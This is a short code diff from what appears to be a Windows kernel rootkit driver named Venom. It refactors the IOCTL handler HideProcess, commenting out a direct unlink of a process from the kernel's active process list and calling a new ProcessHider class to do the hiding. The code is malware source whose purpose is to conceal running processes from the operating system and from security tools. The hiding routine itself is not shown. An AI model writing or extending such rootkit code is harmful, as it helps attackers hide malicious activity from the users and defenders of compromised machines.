@@ -1,5 +1,7 @@
 #include "IoctlHandlers.h"
 #include "ProcHandler.h"
+#include "Process.h"
+#include "Capabilities/ProcessCapabilities/ProcessHider.h"
 #include "TokenHandler.h"
 #include "NetworkHandler.h"
 #include "Venom.h"
@@ -45,8 +47,10 @@ NTSTATUS IoctlHandlers::HideProcess(PIRP Irp) {
 		Irp->IoStatus.Information = 0;
 		return STATUS_INVALID_PARAMETER;
 	}
-
-	status = ProcHandler::UnlinkActiveProcessLinks(*pid);
+	auto process = Process(*pid);
+	//status = ProcHandler::UnlinkActiveProcessLinks(*pid);
+	auto processHider = ProcessHider(process);
+	status = processHider.hide();
 	Irp->IoStatus.Information = 0;
 	Irp->IoStatus.Status = status;
 	return status;
